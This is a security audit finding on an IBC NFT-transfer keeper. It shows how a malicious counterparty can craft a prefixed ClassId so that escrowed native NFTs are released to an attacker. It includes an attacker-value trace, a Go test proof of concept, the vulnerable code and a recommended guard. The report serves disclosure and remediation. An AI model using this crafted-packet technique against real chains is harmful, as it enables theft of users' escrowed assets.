### Title
Malicious IBC Counterparty Can Drain Escrowed Native NFTs via Crafted ClassId — (`x/nft-transfer/keeper/packet.go`)

### Summary

`processReceivedPacket` contains no guard preventing a malicious IBC counterparty from crafting a packet whose `data.ClassId` is prefixed with the counterparty's own `sourcePort/sourceChannel/`, causing the receiving chain to interpret the packet as a "back-to-origin" (sink) transfer and unconditionally call `TransferOwner` with the escrow address as the current owner, draining any native NFT that was previously escrowed on that channel.

---

### Finding Description

The vulnerability lives in `processReceivedPacket`: [1](#0-0) 

**Step-by-step trace with attacker-controlled values:**

| Variable | Value |
|---|---|
| `packet.SourcePort` | `"nft"` (counterparty port, attacker-controlled) |
| `packet.SourceChannel` | `"channel-0"` (counterparty channel, attacker-controlled) |
| `data.ClassId` | `"nft/channel-0/nftClass"` (attacker-controlled) |

**Line 148** — direction check:

```go
isAwayFromOrigin := types.IsAwayFromOrigin(
    packet.GetSourcePort(),    // "nft"
    packet.GetSourceChannel(), // "channel-0"
    data.ClassId,              // "nft/channel-0/nftClass"
)
```

`IsAwayFromOrigin` computes `prefixClassID = "nft/channel-0/"` and checks `strings.HasPrefix("nft/channel-0/nftClass", "nft/channel-0/")` → `true`, so it returns `false`. [2](#0-1) 

`isAwayFromOrigin = false` → the `else` (sink / back-to-origin) branch is taken.

**Lines 192–199** — prefix removal and unescrow:

```go
unprefixedClassID := types.RemoveClassPrefix("nft", "channel-0", "nft/channel-0/nftClass")
// → "nftClass"

voucherClassID := types.ParseClassTrace("nftClass").IBCClassID()
// ParseClassTrace: Path="", BaseClassId="nftClass"
// IBCClassID(): Path=="" → returns "nftClass"  (NOT an ibc/... hash)

k.nftKeeper.TransferOwner(ctx, "nftClass", tokenID, escrowAddress, receiver)
``` [3](#0-2) 

`IBCClassID()` only returns the `ibc/{hash}` form when `Path != ""`; for a bare base class it returns the raw string: [4](#0-3) 

The escrow address used is `GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())` — the local channel's escrow address, which is exactly where native NFTs are held when users send them outbound: [5](#0-4) 

**There is no guard anywhere in this path** that checks whether `unprefixedClassID` is an IBC-prefixed class (i.e., starts with `ibc/`) before calling `TransferOwner`. `ValidateBasic` only checks that `ClassId` is non-blank and that addresses are valid: [6](#0-5) 

---

### Impact Explanation

Any native NFT (`nftClass/tokenID`) that was previously escrowed on the channel (because a legitimate user sent it outbound) can be stolen. The attacker specifies an arbitrary `receiver` address in the packet data. `TransferOwner` will succeed as long as the escrow address holds the NFT, transferring ownership to the attacker's receiver. This is a direct, irreversible theft of user-owned NFTs.

---

### Likelihood Explanation

The attacker must control the counterparty chain (or be able to submit a valid, relay-authenticated IBC packet on that channel). This is a realistic threat model for IBC: a malicious or compromised counterparty chain is a standard adversary in cross-chain security. The attacker also needs to know a `(classID, tokenID)` pair currently held in escrow, which is observable on-chain. No governance or privileged local role is required.

---

### Recommendation

Before calling `TransferOwner` in the sink branch, verify that `unprefixedClassID` is an IBC-prefixed class ID (i.e., it still contains a `port/channel/` trace path, meaning it was originally issued as a voucher on this chain). Concretely:

```go
unprefixedClassID := types.RemoveClassPrefix(
    packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

// Guard: the unprefixed ID must still carry a trace path,
// meaning it is an IBC voucher, not a native class.
classTrace := types.ParseClassTrace(unprefixedClassID)
if classTrace.Path == "" {
    return sdkerrors.Wrapf(types.ErrInvalidClassID,
        "sink-direction classId %q resolves to a native class after prefix removal; "+
        "counterparty may be attempting to drain escrow", data.ClassId)
}
voucherClassID := classTrace.IBCClassID()
```

Alternatively, require that the `voucherClassID` starts with `ibc/` before proceeding to `TransferOwner`.

### Proof of Concept

```go
// keeper_test.go (illustrative)
func TestDrainEscrowViaCraftedClassId(t *testing.T) {
    // 1. Setup: escrow a native NFT on channel-0
    //    Simulate a prior legitimate outbound send that placed
    //    nftClass/token1 into the escrow address for (nft, channel-0).
    escrowAddr := types.GetEscrowAddress("nft", "channel-0")
    nftKeeper.MintNFT(ctx, "nftClass", "token1", "", "", "", escrowAddr, escrowAddr)

    // 2. Attacker crafts a packet from the counterparty
    //    sourcePort="nft", sourceChannel="channel-0"
    //    data.ClassId = "nft/channel-0/nftClass"
    data := types.NonFungibleTokenPacketData{
        ClassId:   "nft/channel-0/nftClass",
        TokenIds:  []string{"token1"},
        TokenUris: []string{""},
        Sender:    attackerAddr.String(),
        Receiver:  attackerAddr.String(),
    }
    packet := channeltypes.Packet{
        SourcePort:      "nft",
        SourceChannel:   "channel-0",
        DestinationPort: "nft",
        DestinationChannel: "channel-0",
    }

    // 3. processReceivedPacket is called by OnRecvPacket
    err := keeper.OnRecvPacket(ctx, "ics721-1", packet, data)
    require.NoError(t, err)

    // 4. Assert: attacker now owns the native NFT
    nft, _ := nftKeeper.GetNFT(ctx, "nftClass", "token1")
    require.Equal(t, attackerAddr, nft.GetOwner()) // PASSES — escrow drained
}
```

func (k Keeper) processReceivedPacket(ctx sdk.Context, packet channeltypes.Packet,
	data types.NonFungibleTokenPacketData,
) error {
	receiver, err := sdk.AccAddressFromBech32(data.Receiver)
	if err != nil {
		return err
	}

	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

	// create the escrow address for creating denom and minting nft
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())

	if isAwayFromOrigin {
		// since SendPacket did not prefix the classID, we must prefix classID here
		classPrefix := types.GetClassPrefix(packet.GetDestPort(), packet.GetDestChannel())
		// NOTE: sourcePrefix contains the trailing "/"
		prefixedClassID := classPrefix + data.ClassId

		// construct the class trace from the full raw classID
		classTrace := types.ParseClassTrace(prefixedClassID)
		if !k.HasClassTrace(ctx, classTrace.Hash()) {
			k.SetClassTrace(ctx, classTrace)
		}

		voucherClassID := classTrace.IBCClassID()

		if !k.nftKeeper.HasDenomID(ctx, voucherClassID) {
			if err := k.nftKeeper.IssueDenom(ctx, voucherClassID, voucherClassID, "", data.ClassUri, escrowAddress); err != nil {
				return err
			}
		}
		sdkCtx := sdk.UnwrapSDKContext(ctx)
		sdkCtx.EventManager().EmitEvent(
			sdk.NewEvent(
				types.EventTypeClassTrace,
				sdk.NewAttribute(types.AttributeKeyTraceHash, classTrace.Hash().String()),
				sdk.NewAttribute(types.AttributeKeyClassID, voucherClassID),
			),
		)

		for i, tokenID := range data.TokenIds {
			if err := k.nftKeeper.MintNFT(ctx, voucherClassID, tokenID, "", data.TokenUris[i], "", escrowAddress, receiver); err != nil {
				return err
			}
		}
	} else {
		// If the token moves in the direction of back to origin,
		// we need to unescrow the token and transfer it to the receiver

		// we should remove the prefix. For example:
		// p6/c6/p4/c4/p2/c2/nftClass -> p4/c4/p2/c2/nftClass
		unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
			packet.GetSourceChannel(), data.ClassId)

		voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
		for _, tokenID := range data.TokenIds {
			if err := k.nftKeeper.TransferOwner(ctx,
				voucherClassID, tokenID, escrowAddress, receiver); err != nil {
				return err
			}
		}
	}

```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}
